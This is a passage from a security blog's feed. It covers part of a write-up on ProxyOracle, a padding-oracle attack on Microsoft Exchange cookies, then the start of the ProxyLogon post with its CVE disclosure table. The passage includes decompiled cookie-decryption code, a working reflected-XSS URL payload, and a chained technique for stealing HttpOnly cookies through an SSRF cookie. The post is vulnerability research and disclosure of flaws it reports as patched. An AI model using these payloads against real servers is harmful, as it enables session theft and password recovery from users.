    &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rgb2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rgb3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rsacryptoServiceProvider&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rgb2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;array2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rsacryptoServiceProvider&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rgb3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AesCryptoServiceProvider&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aesCryptoServiceProvider&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;AesCryptoServiceProvider&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;aesCryptoServiceProvider&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Key&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;aesCryptoServiceProvider&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IV&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        
        &lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ICryptoTransform&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cryptoTransform2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aesCryptoServiceProvider&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;CreateDecryptor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;bytes2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cryptoTransform2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;TransformFinalBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;array5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CryptographicException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ex8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ExTraceGlobals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VerboseTracer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IsTraceEnabled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;ExTraceGlobals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VerboseTracer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TraceDebug&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CryptographicException&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetHashCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[FbaModule::ParseCadataCookies] Received CryptographicException {0} transforming auth&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ex8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;httpApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;AppendToLog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;CryptoError=PossibleSSLCertrolloverMismatch&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FormatException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ex9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ExTraceGlobals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VerboseTracer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IsTraceEnabled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;ExTraceGlobals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VerboseTracer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TraceDebug&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FormatException&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetHashCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[FbaModule::ParseCadataCookies] Received FormatException {0} decoding caData auth&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ex9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;httpApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;AppendToLog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;DecodeError=InvalidCaDataAuthCookie&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;@string&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Unicode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Authorization&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;@string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It should be noted that since the IV is encrypted with the SSL certificate private key, we can’t recover the first block of the ciphertext through XOR. But it wouldn’t cause any problem for us because the C# internally processes the strings as UTF-16, so the first 12 bytes of the ciphertext must be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;B\x00a\x00s\x00i\x00c\x00 \x00&lt;/code&gt;. With one more Base64 encoding applied, we will only lose the first 1.5 bytes in the username field.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;(16−6×2) ÷ 2 × (3/4) = 1.5&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;the-exploit&quot;&gt;The Exploit&lt;/h1&gt;

&lt;p&gt;As of now, we have a Padding Oracle that allows us to decrypt any user’s cookie. BUT, how can we get the client cookies? Here we find another vulnerability to chain them together.&lt;/p&gt;

&lt;h2 id=&quot;xss-to-steal-client-cookies&quot;&gt;XSS to Steal Client Cookies&lt;/h2&gt;

&lt;p&gt;We discover an XSS (CVE-2021-31195) in the CAS Frontend (Yeah, CAS again) to chain together, the root cause of this XSS is relatively easy: Exchange forgets to sanitize the data before printing it out so that we can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt; to escape from the JSON format and inject arbitrary JavaScript code.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://exchange/owa/auth/frowny.aspx
?app=people
&amp;amp;et=ServerError
&amp;amp;esrc=MasterPage
&amp;amp;te=\
&amp;amp;refurl=}}};alert(document.domain)//
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/2/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But here comes another question: all the sensitive cookies are protected by the HttpOnly flag, which makes us unable to access the cookies by JavaScript. WHAT SHOULD WE DO?&lt;/p&gt;

&lt;h2 id=&quot;bypass-the-httponly&quot;&gt;Bypass the HttpOnly&lt;/h2&gt;

&lt;p&gt;As we could execute arbitrary JavaScript on browsers, why don’t we just insert the SSRF cookie we used in ProxyLogon? Once we add this cookie and assign the Backend target value as our malicious server, Exchange will become a proxy between the victims and us. We can then take over all the client’s HTTP static resources and get the protected HttpOnly cookies!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/2/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By chaining bugs together, we have an elegant exploit that can steal any user’s cookies by just sending him/her a malicious link. What’s noteworthy is that the XSS here is only helping us to steal the cookie, which means all the decryption processes wouldn’t require any authentication and user interaction. Even if the user closes the browser, it wouldn’t affect our Padding Oracle Attack!&lt;/p&gt;

&lt;p&gt;Here is the &lt;a href=&quot;https://www.youtube.com/watch?v=VuJvmJZxogc&quot;&gt;demonstration video&lt;/a&gt; showing how we recover the victim’s password:&lt;/p&gt;

&lt;div style=&quot;text-align: center;&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/VuJvmJZxogc&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;&lt;/div&gt;

&lt;!-- # The Timeline

* --&gt;
</description>
                <link>https://devco.re/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-2-ProxyOracle/</link>
                <guid>https://devco.re/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-2-ProxyOracle</guid>
                <pubDate>Fri, 06 Aug 2021 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>A New Attack Surface on MS Exchange Part 1 - ProxyLogon!</title>
                <description>&lt;style type=&quot;text/css&quot;&gt;
    table {
        width: 100%;
        overflow: auto;
        word-break: normal;
        word-break: keep-all;
        font-size: 0.6em;
    }

    table th {
        font-weight: bold
    }

    table th,
    table td {
        padding: 5px 11px;
        border: 1px solid #ddd;
    }

    table tr {
        background-color: #fff;
        border-top: 1px solid #ccc;
    }

    table tr:nth-child(2n) {
        background-color: #f8f8f8;
    }
    .center-image {
        margin: 0 auto;
        display: block;
    }
&lt;/style&gt;

&lt;p&gt;The series of A New Attack Surface on MS Exchange:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon/&quot;&gt;A New Attack Surface on MS Exchange Part 1 - ProxyLogon!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-2-ProxyOracle/&quot;&gt;A New Attack Surface on MS Exchange Part 2 - ProxyOracle!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2021/08/22/a-new-attack-surface-on-MS-exchange-part-3-ProxyShell/&quot;&gt;A New Attack Surface on MS Exchange Part 3 - ProxyShell!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2022/10/19/a-new-attack-surface-on-MS-exchange-part-4-ProxyRelay/&quot;&gt;A New Attack Surface on MS Exchange Part 4 - ProxyRelay!&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Microsoft Exchange, as one of the most common email solutions in the world, has become part of the daily operation and security connection for governments and enterprises. This January, we reported a series of vulnerabilities of Exchange Server to Microsoft and named it as &lt;a href=&quot;https://proxylogon.com/&quot;&gt;ProxyLogon&lt;/a&gt;. ProxyLogon might be the most severe and impactful vulnerability in the Exchange history ever. If you were paying attention to the industry news, you must have heard it.&lt;/p&gt;

&lt;p&gt;While looking into ProxyLogon from the architectural level, we found it is not just a vulnerability, but an attack surface that is totally new and no one has ever mentioned before. This attack surface could lead the hackers or security researchers to more vulnerabilities. Therefore, we decided to focus on this attack surface and eventually found at least 8 vulnerabilities. These vulnerabilities cover from server side, client side, and even crypto bugs. We chained these vulnerabilities into 3 attacks:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ProxyLogon: The most well-known and impactful Exchange exploit chain&lt;/li&gt;
  &lt;li&gt;ProxyOracle: The attack which could recover any password in plaintext format of Exchange users&lt;/li&gt;
  &lt;li&gt;ProxyShell: The exploit chain we demonstrated at &lt;a href=&quot;https://twitter.com/thezdi/status/1379467992862449664&quot;&gt;Pwn2Own 2021&lt;/a&gt; to take over Exchange and earn $200,000 bounty&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;I would like to highlight that all vulnerabilities we unveiled here are logic bugs, which means they could be reproduced and exploited more easily than any memory corruption bugs. We have presented our research at &lt;a href=&quot;https://www.blackhat.com/us-21/briefings/schedule/index.html#proxylogon-is-just-the-tip-of-the-iceberg-a-new-attack-surface-on-microsoft-exchange-server-23442&quot;&gt;Black Hat USA&lt;/a&gt; and &lt;a href=&quot;https://www.defcon.org/html/defcon-29/dc-29-speakers.html&quot;&gt;DEFCON&lt;/a&gt;, and won the Best Server-Side bug of &lt;a href=&quot;https://pwnies.com/winners/&quot;&gt;Pwnie Awards 2021&lt;/a&gt;. You can check our presentation materials here:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ProxyLogon is Just the Tip of the Iceberg: A New Attack Surface on Microsoft Exchange Server! &lt;a href=&quot;https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-ProxyLogon-Is-Just-The-Tip-Of-The-Iceberg-A-New-Attack-Surface-On-Microsoft-Exchange-Server.pdf&quot;&gt;[Slides]&lt;/a&gt; &lt;a href=&quot;https://www.youtube.com/watch?v=5mqid-7zp8k&quot;&gt;[Video]&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;By understanding the basics of this new attack surface, you won’t be surprised why we can pop out 0days easily!&lt;/p&gt;

&lt;h1 id=&quot;intro&quot;&gt;Intro&lt;/h1&gt;

&lt;p&gt;I would like to state that all the vulnerabilities mentioned have been reported via the responsible vulnerability disclosure process and patched by Microsoft. You could find more detail of the CVEs and the report timeline from the following table.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Report Time&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Name&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;CVE&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Patch Time&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;CAS&lt;sup&gt;[1]&lt;/sup&gt;&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Reported By&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jan 05, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyLogon&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855&quot;&gt;CVE-2021-26855&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Mar 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Yes&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai, Volexity and MSTIC&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jan 05, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyLogon&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065&quot;&gt;CVE-2021-27065&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Mar 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai, Volexity and MSTIC&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jan 17, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyOracle&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31196&quot;&gt;CVE-2021-31196&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jul 13, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Yes&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jan 17, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyOracle&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31195&quot;&gt;CVE-2021-31195&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;May 11, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Apr 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyShell&lt;sup&gt;[2]&lt;/sup&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473&quot;&gt;CVE-2021-34473&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Apr 13, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Yes&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai working with ZDI&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Apr 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyShell&lt;sup&gt;[2]&lt;/sup&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34523&quot;&gt;CVE-2021-34523&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Apr 13, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Yes&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai working with ZDI&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Apr 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyShell&lt;sup&gt;[2]&lt;/sup&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31207&quot;&gt;CVE-2021-31207&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;May 11, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai working with ZDI&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jun 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Yes&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jun 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
